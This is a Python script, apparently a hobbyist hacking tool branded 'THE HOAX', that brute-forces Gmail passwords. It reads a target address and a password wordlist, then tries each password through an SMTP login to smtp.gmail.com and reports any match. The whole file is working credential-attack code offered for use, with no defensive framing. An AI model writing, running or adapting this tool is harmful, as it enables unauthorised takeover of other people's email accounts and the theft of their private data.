try:
    import smtplib
    import os.path
    import re
    from termcolor import colored
    import requests
except ModuleNotFoundError as e:
    print(e)
    print("TRY INSTALL THE REQUIRED MODULE USING PIP3 ....///")

print(colored(r'''
    --------- |     | 0000000    /\    /\     0000   0000000000000000000000000000000000000000000000
        |     |_____| 0  o  0   /  \  /  \   0    0  0                       0000000     0000      00000000
        |     |     | 0  o  0  /    \/    \  000000  0000000                 0          0    0        0
        |     |     | 0000000 /            \ 0    0         0       THE      0          000000        0
        |                    /              \               0                0000000    0    0        0
        | 000000000000000000000000000000000000000000000000000
        |                                   
                                                        --- THE HOAX
''',"blue",attrs=["bold" , "underline"]))


def brutegmail(gmail, passwd):
    try:
        g = smtplib.SMTP("smtp.gmail.com", 587)
        g.starttls()
        g.login(str(gmail), passwd)
        print(f"found {passwd}")
        exit(1)
    except smtplib.SMTPAuthenticationError as e:
        msg = re.match("(.*)Username and Password not accepted(.*)", str(e))
        if msg:
            print(colored(f"wrong {passwd}" , "red"))
        else:
            print(colored(f"[+]\n\nfound {passwd}[+]","green"))
            exit(1)


def start(gmail, passwd_list):
    if not (os.path.exists(passwd_list)):
        print("enter the correct password list .....\n")
        passwd_list = input("entert the passwdlist : ")
        start(gmail, passwd_list)
    print("passwordlist exists.....")
    with open(passwd_list, "r") as f:
        for password in f.readlines():
            password = password.strip("\n")
            brutegmail(gmail, password)
def checking_availability_internet():
    try:
        s = requests.get("https://www.google.com")
    except:
        print("CHECK YOUR INTERNET CONNECTIVITY")
        exit(0)
try:
    checking_availability_internet()
    gmail = input(colored("enter the gmail : ","green"))
    passwd_list = input(colored("enter the password path containing the list : ","green"))
    start(gmail, passwd_list)
except KeyboardInterrupt:
    print("\n\n\nTHANKS FOR USING US")

